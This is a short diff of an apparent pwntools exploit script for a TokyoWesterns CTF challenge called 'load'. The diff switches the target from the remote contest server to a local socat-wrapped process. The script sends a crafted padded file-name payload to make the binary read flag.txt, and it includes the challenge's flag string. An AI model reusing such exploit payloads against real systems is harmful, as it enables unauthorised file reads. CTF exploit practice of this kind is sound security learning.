@@ -18,7 +18,8 @@ while True:
 	done = True
 	for p in "TWCTF{pr0cf5_15_h1ghly_fl3x1bl3}"[idx:]:
 #		r = process(["./load"])
-		r = remote("pwn1.chal.ctf.westerns.tokyo",34835)
+		r = process("socat - system:./load,pty,raw,echo=0".split())
+		#r = remote("pwn1.chal.ctf.westerns.tokyo",34835)
 		r.sendlineafter(":","/dev/stdin".ljust(0x10,"\x00")+"flag.txt\x00".ljust(0x30,'\x00')+p64(0xfe))
 		r.sendlineafter(":","0")
 		r.sendlineafter(":",str(0x1000))
